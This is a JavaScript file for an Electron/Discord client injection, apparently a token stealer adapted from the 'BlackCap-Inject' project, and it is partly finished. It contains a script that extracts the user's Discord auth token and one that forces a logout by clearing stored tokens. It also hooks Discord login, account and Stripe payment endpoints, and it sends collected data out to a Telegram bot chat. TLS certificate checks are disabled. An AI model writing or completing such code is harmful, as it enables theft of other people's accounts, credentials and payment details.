process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;

const fs = require("fs");
const electron = require("electron");
const https = require("https");
const queryString = require("querystring");

// --- Prompt for Telegram Credentials ---
const readline = require('readline').createInterface({
  input: process.stdin,
  output: process.stdout
});

let TELEGRAM_BOT_TOKEN = "";
let TELEGRAM_CHAT_ID = "";

// Function to ask questions
function question(query) {
  return new Promise(resolve => readline.question(query, resolve));
}

(async () => {
  console.log("=== Telegram Notification Setup ===");
  TELEGRAM_BOT_TOKEN = await question("Enter your Telegram Bot Token: ");
  TELEGRAM_CHAT_ID = await question("Enter your Telegram Chat ID: ");
  readline.close();

  // Validate token
  const validateUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`;
  https.get(validateUrl, (res) => {
    if (res.statusCode !== 200) {
      console.error("Invalid Telegram Bot Token. Exiting...");
      process.exit(1);
    }
    // Proceed with rest of script
    main();
  }).on('error', () => {
    console.error("Failed to validate token. Exiting...");
    process.exit(1);
  });
})();

async function main() {

const computerName = process.env.COMPUTERNAME;
const path = require('path');

const tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`;
const logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();`;
const doTheLogOut = fs.existsSync("./d3dcompiler.dlll") ? true : false;

const config = {
    "logout": "true",
    "logout-notify": "true",
    "init-notify": "true",
    "embed-color": 374276,
    injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
    // Removed webhook placeholder
    Filter: {
        "urls": [
            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
            "https://*.discord.com/api/v*/applications/detectable",
            "https://discord.com/api/v*/applications/detectable",
            "https://*.discord.com/api/v*/users/@me/library",
            "https://discord.com/api/v*/users/@me/library",
            "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
            "https://discord.com/api/v*/users/@me/billing/subscriptions",
            "wss://remote-auth-gateway.discord.gg/*"
        ]
    },
    onCompleted: {
        urls: [
            "https://discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/users/@me",
            "https://*.discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/auth/login",
            'https://discord.com/api/v*/auth/login',
            'https://*.discord.com/api/v*/auth/login',
            "https://api.stripe.com/v*/tokens"
        ]
    }
};

// Helper function to send message to Telegram
function sendTelegramMessage(text) {
  const data = JSON.stringify({
    chat_id: TELEGRAM_CHAT_ID,
    text: text,
    parse_mode: 'Markdown'
  });
  const options = {
    hostname: 'api.telegram.org',
    path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data)
    }
  };
  const req = https.request(options, res => {
    // Optional: handle response
  });
  req.on('error', error => {
    console.error(error);
  });
  req.write(data);
  req.end();
}

async function execScript(str) {
    const window = electron.BrowserWindow.getAllWindows()[0];
    const script = await window.webContents.executeJavaScript(str, true);
    return script || null;
}

const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
    let msg = `*${title}*\n`;
    if (description) msg += `${description}\n`;
    fields.forEach(f => {
        msg += `*${f.name}*\n${f.value}\n`;
    });
    if (image) msg += `![image](${image})\n`;
    if (thumbnail) msg += `![thumb](${thumbnail})\n`;
    return msg;
}

// Rest of your existing code...
// At the point where you would call `post()`, replace with:
async function postToTelegram(msg) {
  await sendTelegramMessage(msg);
}

// Example of usage inside your hooks
// Instead of post(params), do:
await postToTelegram("Your message here");

// For example, after extracting user info, construct a message and send
// e.g., await postToTelegram(`User Info:\nName: ...\nID: ...\n`);

// Remember to replace all instances of `post(params)` with `await postToTelegram(msg)`
// where `msg` is a string message you want to send.

}
